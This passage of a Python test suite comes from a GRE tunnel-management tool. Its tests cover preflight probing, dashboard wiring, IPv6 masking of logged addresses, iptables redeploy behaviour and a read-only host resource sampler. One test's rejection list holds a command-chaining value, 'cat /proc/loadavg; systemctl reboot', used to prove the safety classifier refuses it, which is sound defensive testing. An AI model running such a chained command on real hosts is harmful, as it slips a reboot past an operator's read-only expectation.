        self.assertIn("the inner leg decides", out["summary"])
        # dial_host is the inner address on a GRE pair, so it must not be probed twice and counted twice.
        pairs_issued = [(c.split()[-1]) for c in ir.commands]
        self.assertEqual(len(pairs_issued), len(set(pairs_issued)),
                         f"one target probed twice from Iran: {ir.commands}")

        # Each direction aims at the *other* end. Both ends reading the same target is how a preflight
        # reports Foreign answering itself and still prints a pass.
        inner_legs = {(l["from"], l["target"]) for l in out["legs"] if l["kind"] == "inner"}
        self.assertEqual(inner_legs, {("iran", inner[1]), ("foreign", inner[0])}, inner_legs)
        iran_inner = [l for l in out["legs"] if l["kind"] == "inner" and l["from"] == "iran"][0]
        self.assertIn(f"iran({inner[0]}) -> inner {inner[1]}", iran_inner["detail"],
                      f"the inner leg does not name both ends of the probe: {iran_inner['detail']}")

        # A target the prober holds is a loop, not a measurement - and it is not even probed.
        looped = dict(pair)
        looped["foreign"] = {"host": "198.51.100.10", "dial_host": inner[0]}
        ir2 = Runner({}, stat(50, 50, 0.0))
        out2 = engine.underlay_preflight(looped, ir2, None, dry_run=False)
        bands = {l["band"] for l in out2["legs"]}
        self.assertIn("SELF_ANSWER", bands, out2["legs"])
        self.assertNotIn("198.51.100.10", " ".join(ir2.commands),
                         "the loop was probed anyway, and a self-answer would read as a measured path")

        # Dry run asks for nothing, and what it lists it does not claim.
        ir3, fr3 = Runner({}, ""), Runner({}, "")
        dry = engine.underlay_preflight(pair, ir3, fr3, dry_run=True)
        self.assertEqual(ir3.commands, [], f"a dry-run preflight issued probes: {ir3.commands}")
        self.assertTrue(dry["legs"], "a dry run lists nothing, so the operator cannot see what it skips")
        self.assertTrue(all(l["band"] == "WOULD_MEASURE" and not l["reachable"] for l in dry["legs"]),
                        f"a dry run asserted a path it never measured: {dry['legs']}")
        self.assertFalse(dry["ok"], "a dry run cannot certify an underlay it did not measure")

        # And it lists them even with nothing to send: `/api/preflight` on a dry-run host opens no runner
        # at all, so a side skipped for want of a runner reported "DRY_RUN: 0 legs" - the same silence the
        # panel exists to replace, and the operator cannot see what was skipped.
        none_run = engine.underlay_preflight(pair, None, None, dry_run=True)
        self.assertEqual([(l["from"], l["kind"], l["target"]) for l in none_run["legs"]],
                         [(l["from"], l["kind"], l["target"]) for l in dry["legs"]],
                         f"a runner-less dry run listed {len(none_run['legs'])} legs against "
                         f"{len(dry['legs'])} - which addresses get probed is decided by the pair, not by "
                         "whether a session happens to be open")

    def test_86_the_dashboard_sends_dial_host_and_offers_the_preflight(self):
        """#41 Acceptance Test: the topology the engine reads is the topology the operator can set.

        `dial_host` was already authoritative in the database and in `pair_side_spec`, and unreachable
        from the form: every payload the page builds sent only `host`, so an operator on this
        infrastructure could not express the underlay address without a hand call to /api/dial_hosts -
        and the address a tunnel dials is the one fact that decides whether it connects. Wiring asserted
        by counting the literals that must all carry the field, so a fourth payload added later without
        it fails here instead of silently dialing the management address.
        """
        page = dashboard.PAGE
        with open(os.path.join(os.path.dirname(__file__), "dashboard.py"), encoding="utf-8") as fh:
            src = fh.read()

        self.assertEqual(page.count('id="a5"'), 1, "no Iran dial_host input")
        self.assertEqual(page.count('id="b5"'), 1, "no Foreign dial_host input")
        side_literals = src.count("auth: { type: 'password'")
        carried = src.count("dial_host: v('a5')") + src.count("dial_host: v('b5')")
        self.assertGreaterEqual(side_literals, 6, "the payload literals this test counts are not there")
        self.assertEqual(carried, side_literals,
                         f"{side_literals} side literals build credentials but only {carried} carry "
                         f"dial_host, so a payload added later would silently dial the management address")
        self.assertIn("p.iran_dial_host", page, "the form does not prefill the stored underlay address")
        self.assertIn("p.foreign_dial_host", page, "the form does not prefill the stored underlay address")

        # The preflight is reachable from the page and through the API, and its legs are rendered.
        self.assertIn("runPreflight", page)
        self.assertIn("/api/preflight", page)
        self.assertIn('self.path == "/api/preflight"', src)
        self.assertIn("engine.underlay_preflight", src)
        # A read endpoint still has to mask what it returns: a ping detail is an address by construction.
        handler = src.split('self.path == "/api/preflight"')[1].split("elif self.path")[0]
        self.assertIn("mask_tree", handler, "the preflight response leaves this process unmasked")

        # And the validator the endpoint reuses still refuses a typo rather than storing a dead topology.
        self.assertEqual(dashboard.request_dial_hosts({"dial_host": "10.10.11.1"}, {}),
                         ("10.10.11.1", ""))
        with self.assertRaises(ValueError):
            dashboard.request_dial_hosts({"dial_host": "10.10.11.256"}, {})

    def test_87_the_address_masker_covers_global_ipv6_because_the_host_has_one_of_those_too(self):
        """#41's census found the leak; this is the rule that closes it.

        `mask_addresses` matched IPv4 only. The rule was never wrong about IPv4 - it was incomplete, and
        the incompleteness showed up the first time a diagnostic printed a chain rather than a scalar: a
        live `ss -tunap` census on Foreign printed its rows in bracket form, `IPV4_RE` passed
        `[2a01:…::1]` through untouched, and twenty-one copies of that host's own routable v6 address were
        written into an artifact under the repository root. A host with a public v4 has a public v6, so
        every "counts, never matched values" invariant this project holds was being met for one address
        family and silently missed for the other.

        Documentation space (RFC 3849, `2001:db8::/32`) stands in for the host address here, and the
        addresses that must *survive* are the point as much as the ones that must not: masking has to keep
        functional text legible (test_58's whole argument), and `::1`, `[::]:443`, `fe80::` and the
        `::ffff:<v4>` mapped form all appear in bind lines, unit files and `ss` rows an operator reads.
        """
        keep = ("::1", "[::]:443", "fe80::1%eth0", "fd00::1234", "::ffff:10.10.11.2",
                "listen tcp [::]:8443: bind: address already in use",
                "ESTAB 0 0 [::ffff:10.10.11.2]:443 [::ffff:10.10.11.1]:41084",
                # The multicast block *name*, the v6 counterpart of the v4 keep list's 224-239 rows: an
                # `ip -6 route` line carries `ff00::/8 dev … proto kernel`, and an inventory transcript that
                # loses it says nothing about why the route is there.
                "ff02::2", "ff00::/8 dev eth0 proto kernel metric 256 pref medium")
        for text in keep:
            self.assertEqual(storage.mask_addresses(text), text,
                             f"identity-free or underlay-only v6 text must survive: {text}")

        # The four global-unicast shapes a live census actually prints: compressed, fully written, in
        # brackets with a port, and with an IPv4 tail embedded. The embedded form is asserted in both
        # halves - the v6 prefix and the v4 tail must both be gone - because that is the shape where a
        # pattern that only matches pure-hex text would stop early and leave the host's IPv4 behind.
        mask = ["2001:db8::1", "2001:db8:85a3::8a2e:370:7334", "[2001:db8:11:335::1]:42668",
                # A non-doc global shape, because doc space alone would let a `2001:db8`-specific rule pass
                # this test. It is the IANA-reserved 6to4 block (RFC 3964, deprecated as a transport by
                # RFC 7528) rather than an address from an allocated pool: the earlier fixture here came
                # from a real allocation's space, and the rule forbids keeping a possibly-live host
                # identifier in committed source when a reserved block exercises the same code path.
                "2001:db8::192.0.2.1", "2002:f900:11:335::1",
                # Eight hextets, fully written. The bound that would not match this is the one this round
                # first shipped: the post-fix scrub found a live `ss` row of exactly this shape still
                # unmasked, so the longest form is a named case here and not an assumption.
                "2001:0db8:0000:0000:0000:0000:0000:0001", "[2001:db8:0:0:0:0:0:1]:443"]
        for text in mask:
            out = storage.mask_addresses(text)
            self.assertNotIn(text, out, f"global v6 literal survived the mask: {out}")
            self.assertNotIn("2001:0db8:0000", out, f"the eight-hextet form leaked: {out}")
            self.assertIn("[addr]", out)
            # Residue, read off the output rather than off the input. Dropping the embedded-v4 tail from the
            # pattern makes `2001:db8::192.0.2.1` mask to `2001:db8::[addr]`: the input string is gone, the
            # v4 half is gone, and every `assertNotIn` above still passes - which is exactly how the seal
            # first proved this assertion set was incomplete. Asking the module's own patterns whether any
            # address-shaped text survives catches it, and stays order-neutral: under either pass order the
            # output has nothing left to match, so this does not make the pass order load-bearing
            # (scratch/seal_mask6_062.out measured that it is not).
            self.assertIsNone(storage.GLOBAL_IPV6_RE.search(out), f"v6-shaped residue after masking: {out}")
            self.assertIsNone(storage.IPV4_RE.search(out), f"v4-shaped residue after masking: {out}")
        self.assertNotIn("192.0.2.1", storage.mask_addresses("2001:db8::192.0.2.1"),
                         "the v4 half of an embedded-v4 literal was left behind")

        # A whole `ss` row, the shape that leaked: both addresses go, the timer text stays, because the
        # timer is what tells the reader whether the row was alive or decaying.
        row = ("ESTAB      0      0  [2001:db8:11:335::1]:42668  [2001:db8::cafe]:443 "
               "timer:(keepalive,40sec,0)")
        masked_row = storage.mask_addresses(row)
        self.assertNotIn("2001:db8", masked_row, masked_row)
        self.assertIn("timer:(keepalive,40sec,0)", masked_row,
                      f"a masked row that lost its timer is not readable: {masked_row}")
        self.assertIn("ESTAB", masked_row)

        # The documented cost of a textual matcher: a clock reading looks like a v6 shorthand, and
        # masking it would destroy the log line for nothing. The first hextet has to be four hex digits
        # precisely so that `23:59:01` is not an address.
        stamp = "Oct 12 23:59:01 foreign sshd[123]: reconnected"
        self.assertEqual(storage.mask_addresses(stamp), stamp,
                         "a timestamp was masked as an IPv6 address")

        # The cost of the slash rule, asserted so that it is a decision rather than an accident. `2000::/3`
        # names a block, not a host, and this pattern masks its head anyway - accepted, because `ip -6 addr`
        # prints a live interface as `inet6 <addr>/64 scope global`, and a pattern that stopped at a `/` to
        # protect prefix prose would pass exactly that row through unmasked. Both halves are pinned: the
        # prose loses its prefix notation, the interface row loses its address. Scratch/seal_mask6_062.py
        # has the mutation that adds a `/` to the lookahead, and it is caught here.
        self.assertEqual(storage.mask_addresses("2000::/3"), "[addr]/3",
                         "prefix prose is masked on purpose - see the ip -6 addr row next")
        self.assertNotIn("2001:db8:1:2::5",
                         storage.mask_addresses("inet6 2001:db8:1:2::5/64 scope global  valid_lft forever"),
                         "a slash-suffixed interface row from `ip -6 addr` was not masked")

        # Structured payloads take the same path as scalars, because the preflight response and the
        # benchmark metrics are dicts of lists of strings.
        nested = storage.mask_addresses({"legs": [{"detail": "peer [2001:db8::1]:443 refused"}],
                                         "bind": "[::]:443"})
        self.assertNotIn("2001:db8", str(nested), nested)
        self.assertEqual(nested["bind"], "[::]:443", nested)

    def test_83_a_redeploy_appends_a_second_copy_and_the_applier_leaves_it_there(self):
        """The limit of option (پ), run against the fake netfilter rather than asserted.

        `deploy_tunnel` executes `iran_cmds` as they are written - bare `-A` and `-I <chain> 1` - and
        nothing in that path deletes the rows an earlier deploy of the same protocol left, so a redeploy
        onto a live pair appends a second copy of every rule. Measured here against the same model test_82
        drives, because the claim is about what a chain does with the command text, not about what the
        command text says. What this round had to learn is what the applier then does with that doubled
        table: it asks `-C` for each row, is answered "present", and installs nothing - exactly right for a
        boot, and silent about the duplication. So (پ) persists a pair's rules across a reboot and does not
        heal a chain a redeploy has fattened; draining duplicates is #49, and it is why this round's live
        run removed the pair's rows with the product's own `teardown_*` text before deploying rather than
        trusting a deploy to be idempotent.
        """
        bash = _product_bash()
        if bash is None:
            self.skipTest("no bash on this host: the chain model cannot be executed, only read")

        plan = protocols.generate_deployment("GRE", 7, "198.51.100.10", "203.0.113.20", 8443)
        manifest_path = f"{protocols.FW_MANIFEST_DIR}/best-tunnel-prod-p7-gre-fw.rules"
        rows = [ln for ln in plan["iran_files"][manifest_path].splitlines() if ln.startswith("R|")]
        iface = protocols.carrier_iface("GRE", 7, "prod")
        cmds = [c for c in plan["iran_cmds"] if c.strip().startswith("iptables")]
        self.assertEqual(len(cmds), len(rows),
                         f"the deploy issues {len(cmds)} netfilter commands but the manifest lists "
                         f"{len(rows)} rows, so the two no longer describe one table")

        def total(state):
            return sum(len(v) for v in _fake_state_of(state).values())

        with tempfile.TemporaryDirectory(prefix="bt_redeploy_") as tmp:
            tmp = tmp.replace("\\", "/")
            bindir = os.path.join(tmp, "bin")
            os.makedirs(bindir)
            for name, body in (("iptables", _FAKE_IPTABLES), ("iptables-nft", _FAKE_IPTABLES),
                               ("ip", _FAKE_IP), ("sysctl", _FAKE_SYSCTL),
                               ("sleep", "#!/bin/bash\nexit 0\n")):
                with open(os.path.join(bindir, name), "w", newline="\n", encoding="utf-8") as fh:
                    fh.write(body)
            script = os.path.join(tmp, "reapply.sh")
            with open(script, "w", newline="\n", encoding="utf-8") as fh:
                fh.write(protocols.FW_REAPPLY_SCRIPT)
            man = os.path.join(tmp, "manifest.rules")
            with open(man, "w", newline="\n", encoding="utf-8") as fh:
                fh.write(plan["iran_files"][manifest_path])
            state = os.path.join(tmp, "state")
            subprocess.run([bash, "-c", f'chmod 755 "{bindir}"/* "{script}"'],
                           capture_output=True, text=True)
            env = dict(os.environ)
            env["PATH"] = bindir + os.pathsep + env["PATH"]
            env.update({"FAKE_IPT_STATE": state, "FAKE_IPT_LOG": os.path.join(tmp, "calls.log"),
                        "FAKE_SYSCTL_LOG": os.path.join(tmp, "sysctl.log"), "FAKE_IFACE": iface})

            def deploy_pass():
                subprocess.run([bash, "-c", 'for c in "$@"; do eval "$c"; done', "drive", *cmds],
                               capture_output=True, text=True, env=env)
                return total(state)

            first = deploy_pass()
            self.assertEqual(first, len(rows),
                             f"the first deploy laid {first} rows, not the {len(rows)} it lists")
            second = deploy_pass()
            self.assertEqual(second, 2 * first,
                             f"a second deploy left {second} rows where the chain held {first}: either "
                             f"iptables deduplicates `-A`, or this model no longer does what the deploy "
                             f"asks - and the doubling it shows is this round's reason to drain first")

            r = subprocess.run([bash, script, man], capture_output=True, text=True, env=env)
            out = ((r.stdout or "") + (r.stderr or "")).replace(chr(0), "").strip()
            self.assertEqual(r.returncode, 0, f"the applier refused a table of its own rows: {out}")
            self.assertIn(f"present={len(rows)} applied=0", out,
                          f"the applier did not read the doubled table as already installed: {out}")
            self.assertEqual(total(state), second,
                             "the applier edited a chain it was only asked to confirm - a restore that "
                             "reorders rules it does not own is worse than one that does nothing")

    # --- Host resource telemetry (round 063, ruling 1) -------------------------------------------

    def test_89_the_resource_sampler_only_asks_for_reads_the_classifier_already_proves_inert(self):
        """The sampler's vocabulary is bounded by `safety`, and nothing was widened to fit it.

        This runs on production hosts through the same runner that gates a deploy, so every command has to
        clear `is_read_only_command` on its own text - the same proof the retry path demands. The negative
        half is the part that would rot silently: `vmstat`, `nstat` and a `| grep` all read like harmless
        diagnostics, and if this product ever grew one, the assertion that fails should be this one, not a
        live deploy.
        """
        names = [n for n, _ in engine.RESOURCE_SAMPLE_COMMANDS]
        self.assertEqual(len(names), len(set(names)), "two sources share a name - one would overwrite "
                                                     "the other in the readings dict")
        for name, cmd in engine.RESOURCE_SAMPLE_COMMANDS:
            self.assertTrue(safety.is_read_only_command(cmd),
                            f"{name}: `{cmd}` is not provably inert, so a dropped session could never "
                            f"re-issue it and it must not be issued at all")
            self.assertTrue(safety.check_command_safe(cmd), f"{name}: `{cmd}` trips the destructive blocklist")
            # One command, one file, one verdict. A pipe classifies as read-only when both ends are inert
            # programs (`cat /proc/uptime | head -1` does, measured), so this is a design rule rather than a
            # refusal - and it is the rule that keeps a reading's *text* separate from its state: if the
            # filtering happened on the host, an empty pipeline and a missing file would both arrive as
            # nothing, which is the collapse this round exists to prevent.
            self.assertFalse(any(ch in cmd for ch in ";|&<>$`"),
                             f"{name}: `{cmd}` is more than one read, so its exit status describes neither")
        for rejected in ("vmstat 1 2", "nstat -az", "iostat -x 1", "cat /proc/loadavg | tee /tmp/l",
                         "uptime > /tmp/u", "cat /proc/loadavg; systemctl reboot"):
            self.assertFalse(safety.is_read_only_command(rejected),
                             f"`{rejected}` now classifies as read-only: either the allowlist moved or "
                             f"this test stopped meaning what it says")

    def test_90_every_source_is_judged_on_its_own_text_and_an_unread_number_stays_None(self):
        """The six states of one reading, reached deliberately - and no branch invents a zero.

        A sensor that could not be read and a sensor that read zero are different faults with different
        fixes; report054 paid for collapsing them in a capacity score, and a capacity panel that renders an
        unreadable /proc as `load 0.0` tells the operator to leave this host alone.
        """
        cases = [
            # (source, text, rc, stderr, expected state, expected field assertions)
            ("load", "0.42 0.31 0.20 2/123 4567\n", 0, "", "measured",
             {"load1": 0.42, "load5": 0.31, "load15": 0.20}),
            ("load", "", 0, "", "empty", {"load1": None}),
            ("load", "garbage from a foreign locale\n", 0, "", "unparsed", {"load1": None}),
            ("load", "", 1, "cat: /proc/loadavg: No such file or directory\n", "absent", {"load1": None}),
            ("load", "", 1, "cat: /proc/loadavg: Permission denied\n", "failed", {"load1": None}),
            ("load", "0.42 0.31\n", 0, "", "partial", {"load1": 0.42, "load15": None}),
            ("cpu_count", "4\n", 0, "", "measured", {"ncpu": 4}),
            ("cpu_count", "0\n", 0, "", "partial", {"ncpu": None}),
            ("cpu_count", "not a number\n", 0, "", "unparsed", {"ncpu": None}),
            ("memory", "MemTotal:  1000 kB\nMemAvailable: 250 kB\n", 0, "", "measured",
             {"mem_total_kb": 1000, "mem_available_kb": 250, "mem_used_pct": 75.0}),
            ("memory", "MemTotal:  1000 kB\nMemFree:  100 kB\n", 0, "", "partial",
             {"mem_total_kb": 1000, "mem_available_kb": None, "mem_used_pct": None}),
            # Available larger than total is not a negative usage percentage; the field is dropped instead.
            ("memory", "MemTotal:  1000 kB\nMemAvailable: 2000 kB\n", 0, "", "measured",
             {"mem_available_kb": 2000, "mem_used_pct": None}),
            ("memory", "", 1, "cat: /proc/meminfo: No such file or directory\n", "absent",
             {"mem_total_kb": None}),
            ("disk", "Filesystem 1024-blocks Used Available Capacity Mounted on\n"
                     "/dev/sda1 41052824 7410280 31522076 20% /\n"
                     "/dev/sdb1 9845632 1234560 8100000 14% /var\n", 0, "", "measured",
             {"root_total_kb": 41052824, "root_used_pct": 20.0, "fullest_mount": "/",
              "fullest_used_pct": 20.0}),
            # One of two arguments failing: the surviving row is still real, so this is `partial`, and a
            # reader must be able to see that a mount was not sampled.
            ("disk", "Filesystem 1024-blocks Used Available Capacity Mounted on\n"
                     "/dev/sda1 41052824 7410280 31522076 20% /\n", 1, "df: /var: can't stat\n",
             "partial", {"root_used_pct": 20.0}),
            ("disk", "Filesystem 1024-blocks Used Available Capacity Mounted on\n", 0, "", "unparsed",
             {"mounts": []}),
            ("disk", "", 1, "df: /nowhere: No such file or directory\n", "absent", {"mounts": []}),
            ("uptime", "123456.78 456789.01\n", 0, "", "measured", {"uptime_sec": 123456.78}),
            ("uptime", "no lines here\n", 0, "", "unparsed", {"uptime_sec": None}),
            ("boot_id", "3F2A1B4C-5d6e-7f80-91a2-b3c4d5e6f708\n", 0, "", "measured",
             {"boot_id": "3f2a1b4c-5d6e-7f80-91a2-b3c4d5e6f708"}),
            ("boot_id", "not-a-uuid\n", 0, "", "unparsed", {"boot_id": None}),
        ]
        for name, text, rc, err, want_state, wants in cases:
            fields, state = engine.parse_resource_reading(name, text, rc, err)
            self.assertEqual(state, want_state, f"{name} {text[:24]!r} rc={rc}: got {state}")
            self.assertEqual(state in engine.RESOURCE_STATES, True, f"{state} is not a declared state")
            for key, want in wants.items():
                self.assertEqual(fields.get(key, "MISSING"), want, f"{name}: {key}")
            for key, want in wants.items():
                if want is not None:
                    continue
                # The other half of the invariant: an unread number is absent, never 0 and never "".
                self.assertIsNone(fields.get(key), f"{name}: {key} must stay None, not become a zero")
        fields, state = engine.parse_resource_reading("nonsense", "x\n", 0, "")
        self.assertEqual((state, fields), ("unparsed", {}), "an unknown source name must not be measured")

    def test_91_collect_host_resources_reads_six_sources_and_reports_each_on_its_own(self):
        """The call over a session: dry-run silence, full sample, and one broken source among five good."""
        ir = RecordingRunner(host_role="iran")
        preview = engine.collect_host_resources(ir, 1, "iran", dry_run=True)
        self.assertEqual(ir.commands, [], "a dry run issued host commands")
        self.assertIsNone(preview["row"], "a dry run produced a row that a caller could persist")
        self.assertFalse(preview["ok"])
        self.assertIn("DRY_RUN", preview["summary"])

        host = RecordingRunner(host_role="iran")
        sample = engine.collect_host_resources(host, 1, "iran", dry_run=False)
        self.assertEqual([c for c in host.commands],
                         [cmd for _, cmd in engine.RESOURCE_SAMPLE_COMMANDS],
                         "the sampler did not issue exactly its declared vocabulary, in order")
        self.assertTrue(sample["ok"], sample["summary"])
        self.assertEqual({n: r["state"] for n, r in sample["readings"].items()},
                         {n: "measured" for n, _ in engine.RESOURCE_SAMPLE_COMMANDS})
        row = sample["row"]
        self.assertEqual((row["load1"], row["ncpu"], row["load1_per_core_pct"]), (0.42, 4, 10.5))
        self.assertEqual((row["mem_total_kb"], row["mem_available_kb"], row["mem_used_pct"]),
                         (3883264, 1043264, 73.1))
        self.assertEqual((row["disk_used_pct"], row["disk_fullest_mount"]), (20.0, "/"))
        self.assertEqual(row["uptime_sec"], 123456.78)
        self.assertEqual(row["boot_id"], "3f2a1b4c-5d6e-7f80-91a2-b3c4d5e6f708")

        # One source absent: its numbers are None, its neighbours keep theirs, and `ok` says so.
        host2 = RecordingRunner(host_role="iran")
        host2.state["resources"] = {"absent": ["memory"]}
        s2 = engine.collect_host_resources(host2, 1, "iran", dry_run=False)
        self.assertEqual(s2["missing"], ["memory"], s2["summary"])
        self.assertFalse(s2["ok"])
        self.assertEqual(s2["readings"]["memory"]["state"], "absent")
        self.assertEqual(s2["readings"]["load"]["state"], "measured",
                         "one source's failure was allowed to contaminate another's")
        for key in ("mem_total_kb", "mem_available_kb", "mem_used_pct", "swap_total_kb"):
            self.assertIsNone(s2["row"][key], f"{key} was fabricated out of an absent source")
        self.assertEqual(s2["row"]["load1"], 0.42)

        # rc non-zero with an unfamiliar stderr is `failed`, and a zero-byte read is `empty` - the two
        # shapes an operator diagnoses differently (permissions/eio versus a kernel that has no such file).
        host3 = RecordingRunner(host_role="iran")
        host3.state["fail_cmd"] = "/proc/loadavg"
        host3.state["fail_stderr"] = "cat: /proc/loadavg: Permission denied\n"
        s3 = engine.collect_host_resources(host3, 1, "iran", dry_run=False)
        self.assertEqual(s3["readings"]["load"]["state"], "failed")
        host4 = RecordingRunner(host_role="iran")
        host4.state["resources"] = {"load": ""}
        self.assertEqual(engine.collect_host_resources(host4, 1, "iran",
                                                       dry_run=False)["readings"]["load"]["state"], "empty")

        # A `df` that lost one of its two mounts is the one reading that is both non-zero and usable: its
        # numbers are real, and `ok` stays True. The counterpart below is what makes `partial` mean
        # something - if it were dropped from the usable set, this row would lose its disk numbers.
        host6 = RecordingRunner(host_role="iran")
        host6.state["resources"] = {"disk_partial": True}
        s6 = engine.collect_host_resources(host6, 1, "iran", dry_run=False)
        self.assertEqual(s6["readings"]["disk"]["state"], "partial", s6["summary"])
        self.assertTrue(s6["ok"], f"a partial-but-real reading was called unusable: {s6['summary']}")
        self.assertEqual(s6["row"]["disk_used_pct"], 20.0)
        self.assertEqual(s6["row"]["disk_fullest_mount"], "/")

        # The runner prefixes its failures with the host it addressed. That text is kept for the operator,
        # so it has to go through the same masker every other persisted string does.
        host5 = RecordingRunner(host_role="iran")
        host5.state["fail_cmd"] = "random/boot_id"
        host5.state["fail_stderr"] = "cat: 203.0.113.20: No such file or directory\n"
        s5 = engine.collect_host_resources(host5, 1, "iran", dry_run=False)
        detail = s5["readings"]["boot_id"].get("detail", "")
        self.assertNotIn("203.0.113.20", detail, "a routable address travelled into a sample")
        self.assertIn("[addr]", detail)

    def test_92_the_persisted_row_is_derived_only_from_usable_readings(self):
        """A number cannot reach the row through a reading that was not usable.

        The laundering shape this closes: a parser that found MemTotal and then the read failed on a
        retry, or a caller that accumulated fields as it went. `resource_row` reads only sources in a
        usable state, so an unusable one contributes nothing at all - and the per-core figure needs both
        its operands, not a guessed core count.
        """
        good = engine.parse_resource_reading("load", "1.0 1.0 1.0 1/1 1\n", 0, "")[0]
        readings = {
            "load": {"state": "measured", **good},
            "cpu_count": {"state": "failed", "ncpu": 8},
            "memory": {"state": "unparsed", "mem_total_kb": 999999, "mem_used_pct": 50.0},
            "disk": {"state": "absent"},
            "uptime": {"state": "failed", "uptime_sec": 12.0},
            "boot_id": {"state": "measured", "boot_id": "a" * 8 + "-1234-5678-9abc-def012345678"},
        }
        row = engine.resource_row(1, "iran", readings)
        self.assertEqual(row["load1"], 1.0)
        for key in ("ncpu", "load1_per_core_pct", "mem_total_kb", "mem_used_pct", "disk_total_kb",
                    "disk_used_pct", "uptime_sec"):
            self.assertIsNone(row[key], f"{key} was carried out of a reading that was not usable")
        self.assertEqual(row["boot_id"], "a" * 8 + "-1234-5678-9abc-def012345678")
        self.assertEqual(set(row["source_states"]), set(n for n, _ in engine.RESOURCE_SAMPLE_COMMANDS),
                         "a source the sampler declares is missing from the row's own account of itself")
        # A reading the caller never produced is declared, not omitted - so a NULL in the row always has a
        # state next to it explaining why.
        self.assertEqual(engine.resource_row(1, "iran", {})["source_states"]["load"], "unparsed")
        # The per-core figure is load over cores, and it disappears with either operand.
        both = dict(readings)
        both["cpu_count"] = {"state": "measured", "ncpu": 4}
        self.assertEqual(engine.resource_row(1, "iran", both)["load1_per_core_pct"], 25.0)

    def test_93_schema_v9_persists_NULL_and_keeps_the_table_bounded(self):
        """Migration 9 writes NULL where a source was unusable, masks what it stores, and does not grow forever."""
        # The constant and the migrations have to move together, and in both directions: bumping the number
        # with no migration leaves every "reached the current schema" assertion in this file lying, and
        # writing a migration without bumping it is the same defect wearing the other hat.
        self.assertEqual(storage.SCHEMA_VERSION, 14, "migration 14 (Phase 6 health history) is "
                                                    "the newest this round writes")
        self.assertEqual(storage.get_schema_version(), storage.SCHEMA_VERSION)
        with storage.db_session() as conn:
            self.assertIn("uptime_sec", storage.get_column_names(conn, "host_resources"))

        partial = {"pair_id": 91, "host_role": "iran", "load1": 0.5, "ncpu": None,
                   "mem_total_kb": None, "mem_used_pct": None, "disk_used_pct": None,
                   "uptime_sec": None, "boot_id": "",
                   "source_states": {"load": "measured", "memory": "absent"}}
        row_id = storage.record_host_resources(partial)
        self.assertGreater(row_id, 0)
        latest = storage.latest_host_resources(91)
        self.assertEqual(set(latest), {"iran", "foreign"})
        stored = latest["iran"]
        self.assertEqual(stored["load1"], 0.5)
        for key in ("ncpu", "mem_total_kb", "mem_used_pct", "disk_used_pct", "uptime_sec"):
            self.assertIsNone(stored[key], f"{key} came back as {stored[key]!r}: the schema turned a "
                                           f"missing reading into a zero")
        self.assertIsNone(latest["foreign"], "a host that was never sampled must read as absent, not as a row")
        self.assertIn('"memory": "absent"', stored["source_states"])

        # `latest` has to mean most recent, and a whole row. The reboot witness (ruling 3) reads it as
        # "what did this host report after it came back", so an older sample winning on insertion order,
        # or a new row inheriting a column the old row filled, both produce a confident wrong answer.
        storage.record_host_resources({"pair_id": 91, "host_role": "iran", "load1": 0.9,
                                       "uptime_sec": 42.0, "boot_id": "newer-boot"})
        newest = storage.latest_host_resources(91)["iran"]
        self.assertEqual(newest["uptime_sec"], 42.0, "latest_host_resources returned an older sample")
        self.assertEqual(newest["boot_id"], "newer-boot")
        self.assertIsNone(newest["mem_total_kb"], "the newest row inherited a value from the row it "
                                                 "replaced in the reader's view")

        # Masked on the way in, whatever path a value arrives by.
        storage.record_host_resources({"pair_id": 92, "host_role": "foreign",
                                        "disk_fullest_mount": "/mnt/203.0.113.20/var",
                                        "source_states": {"load": "measured on 198.51.100.10"}})
        row = storage.latest_host_resources(92)["foreign"]
        for value in (row["disk_fullest_mount"], row["source_states"]):
            self.assertNotIn("203.0.113.20", value)
            self.assertNotIn("198.51.100.10", value)

        # Retention, in both directions: the newest survive and the count holds at the bound. Patching
        # the constant is honest here because the function reads it at call time; a seal would only prove
        # the number, not the behaviour.
        saved = storage.HOST_RESOURCE_KEEP_ROWS
        try:
            storage.HOST_RESOURCE_KEEP_ROWS = 3
            for i in range(5):
                storage.record_host_resources({"pair_id": 93, "host_role": "iran", "uptime_sec": float(i)})
            hist = storage.host_resource_history(93, "iran")
            self.assertEqual(len(hist), 3, f"retention kept {len(hist)} rows where the bound is 3")
            self.assertEqual([h["uptime_sec"] for h in hist], [4.0, 3.0, 2.0],
                             f"retention kept the wrong end of the history: {hist}")
            # The negative assertion the bound demands: the evicted readings are really gone, and a second
            # host of the same pair was not evicted by them.
            storage.record_host_resources({"pair_id": 93, "host_role": "foreign", "uptime_sec": 7.0})
            self.assertEqual([h["uptime_sec"] for h in storage.host_resource_history(93, "foreign")], [7.0])
            self.assertEqual(len(storage.host_resource_history(93, "iran")), 3,
                             "one host's writes evicted the other host's history")
        finally:
            storage.HOST_RESOURCE_KEEP_ROWS = saved

        self.assertEqual(len(storage.host_resource_history(91, limit=1)), 1, "limit was ignored")
        with storage.db_session() as conn:
            conn.execute("DELETE FROM host_resources WHERE pair_id IN (91, 92, 93)")

    def test_94_pair_collection_writes_only_for_a_real_sample_and_only_when_asked(self):
        """`record` defaults to False, and a dry run cannot write even when a caller asks it to.

        The report056 lesson, applied to the second entry point this round adds: a caller that is *judging*
        a pair must not leave durable rows behind, and a preview that recorded would make the next preview
        look like a measurement. So there are three cases to pin, not one - default-off, explicit-off, and
        explicit-on-refused-by-dry-run.
        """
        def rows_for(pair_id):
            return storage.host_resource_history(pair_id)

        pair = {"id": 94, "iran": {"host": "198.51.100.10"}, "foreign": {"host": "203.0.113.20"}}
        self.assertEqual(rows_for(94), [])

        out = engine.collect_pair_resources(pair, None, None, dry_run=True)
        self.assertEqual(out["recorded"], 0)
        self.assertEqual(rows_for(94), [], "a dry run persisted capacity rows for hosts it never touched")
        self.assertFalse(out["ok"])
        self.assertEqual(set(out["hosts"]), {"iran", "foreign"},
                         "a dry run skipped a side instead of listing what it would have sampled")

        ir, fr = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
        engine.collect_pair_resources(pair, ir, fr, dry_run=False, record=False)
        self.assertEqual(len(ir.commands), len(engine.RESOURCE_SAMPLE_COMMANDS),
                         "the sampler did not read every declared source on a real pass")
        self.assertEqual(rows_for(94), [], "a judging call wrote to the database")

        # The default itself, observed: a call that names no `record` must not write. Without this case a
        # flipped default is invisible to the suite, because every other call site states its value
        # out loud - the exact hole report056 found in the destination-pin gate.
        engine.collect_pair_resources(pair, ir, fr, dry_run=False)
        self.assertEqual(rows_for(94), [], "`record` no longer defaults to off, so every caller that "
                                          "only wants to look is writing capacity rows")

        out = engine.collect_pair_resources(pair, ir, fr, dry_run=False, record=True)
        self.assertEqual(out["recorded"], 2)
